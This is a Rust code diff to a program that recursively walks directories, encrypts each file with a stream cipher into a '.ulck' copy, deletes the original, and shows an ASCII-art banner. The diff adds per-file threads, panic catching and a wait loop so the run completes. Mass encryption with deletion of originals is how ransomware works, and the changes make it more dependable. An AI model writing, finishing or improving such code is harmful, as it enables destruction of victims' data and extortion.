@@ -8,8 +8,11 @@ use rand::RngCore;
 use std::{
     env,
     fs::{self, metadata, File},
-    io::{self, Read, Write},
+    io::{Read, Write},
+    panic,
+    sync::atomic::{AtomicUsize, Ordering},
     thread,
+    time::Duration,
 };
 
 static ENCRYPTED_EXTENSION: &str = ".ulck";
@@ -30,32 +33,32 @@ static COOL_TEXT: &str = r#"    __    __  __    __  __        __    __   ______ 
    $$ \__$$ |$$ |$$$$ |$$ |_____ $$ \__$$ |$$ \__/  |$$ |$$  \ $$ |_____
    $$    $$/ $$ | $$$ |$$       |$$    $$/ $$    $$/ $$ | $$  |$$       |
     $$$$$$/  $$/   $$/ $$$$$$$$/  $$$$$$/   $$$$$$/  $$/   $$/ $$$$$$$$/"#;
+static GLOBAL_THREAD_COUNT: AtomicUsize = AtomicUsize::new(0);
+static MILLISECOND: Duration = Duration::from_millis(1);
 
-fn runFile(sourceFilePath: &str, key: &[u8; 32]) -> Result<(), io::Error> {
+fn runFile(sourceFilePath: &str, key: &[u8; 32]) {
     if sourceFilePath == "" {
-        return Ok(());
+        panic!("Empty path");
     }
 
     for ignore in IGNORE_START {
         if sourceFilePath.starts_with(ignore) {
-            return Ok(());
+            return;
         }
     }
 
     for ignore in IGNORE_END {
         if sourceFilePath.ends_with(ignore) {
-            return Ok(());
+            return;
         }
     }
 
-    let mut sourceFile = File::open(sourceFilePath)?;
-    let metadata = sourceFile.metadata()?;
+    let mut sourceFile = File::open(sourceFilePath).unwrap();
+    let metadata = sourceFile.metadata().unwrap();
 
     if metadata.len() == 0 || metadata.len() > MAX_FILE_SIZE {
-        return Ok(());
+        return;
     }
-
-    println!("Encrypting file: {}", sourceFilePath);
 
     let destinationFilePath = sourceFilePath.to_owned() + ENCRYPTED_EXTENSION;
 
@@ -68,41 +71,30 @@ fn runFile(sourceFilePath: &str, key: &[u8; 32]) -> Result<(), io::Error> {
     const BUFFER_LEN: usize = 500;
     let mut buffer = [0u8; BUFFER_LEN];
 
-    let mut distFile = File::create(destinationFilePath)?;
-    match distFile.write_all(&nonce) {
-        Ok(_) => (),
-        Err(_) => return Ok(()),
-    };
+    let mut distFile = File::create(destinationFilePath).unwrap();
+    distFile.write_all(&nonce).unwrap();
 
     loop {
-        let read_count = sourceFile.read(&mut buffer)?;
+        let readCount = sourceFile.read(&mut buffer).unwrap();
 
-        if read_count == BUFFER_LEN {
-            let ciphertext = streamEncryptor.encrypt_next(buffer.as_slice());
+        if readCount == BUFFER_LEN {
+            let ciphertext = streamEncryptor.encrypt_next(buffer.as_slice()).unwrap();
 
-            match ciphertext {
-                Ok(ciphertext) => {
-                    distFile.write(&ciphertext)?;
-                }
-                Err(_) => break,
-            }
+            distFile.write(&ciphertext).unwrap();
         } else {
-            let ciphertext = streamEncryptor.encrypt_last(&buffer[..read_count]);
+            let ciphertext = streamEncryptor.encrypt_last(&buffer[..readCount]).unwrap();
 
-            match ciphertext {
-                Ok(ciphertext) => {
-                    distFile.write(&ciphertext)?;
-                }
-                Err(_) => break,
-            }
+            distFile.write(&ciphertext).unwrap();
 
             break;
         }
     }
 
-    fs::remove_file(sourceFilePath)?;
+    drop(sourceFile);
 
-    Ok(())
+    fs::remove_file(sourceFilePath).unwrap();
+
+    println!("Encrypted file: {}", sourceFilePath);
 }
 
 fn runDirEntry(dirEntryPath: &str, key: &[u8; 32]) {
@@ -129,7 +121,17 @@ fn runDirEntry(dirEntryPath: &str, key: &[u8; 32]) {
     } else {
         let newDirEntryPath = dirEntryPath.to_owned();
         let newKey = key.to_owned();
-        thread::spawn(move || runFile(&newDirEntryPath, &newKey));
+        GLOBAL_THREAD_COUNT.fetch_add(1, Ordering::SeqCst);
+        thread::spawn(move || {
+            let result = panic::catch_unwind(|| runFile(&newDirEntryPath, &newKey));
+
+            match result {
+                Ok(_) => (),
+                Err(_) => println!("Error encrypting file: {}", &newDirEntryPath),
+            }
+
+            GLOBAL_THREAD_COUNT.fetch_sub(1, Ordering::SeqCst);
+        });
     }
 }
 
@@ -170,5 +172,9 @@ fn main() {
             },
             Err(_) => (),
         }
+    }
+
+    while GLOBAL_THREAD_COUNT.load(Ordering::SeqCst) != 0 {
+        thread::sleep(MILLISECOND);
     }
 }
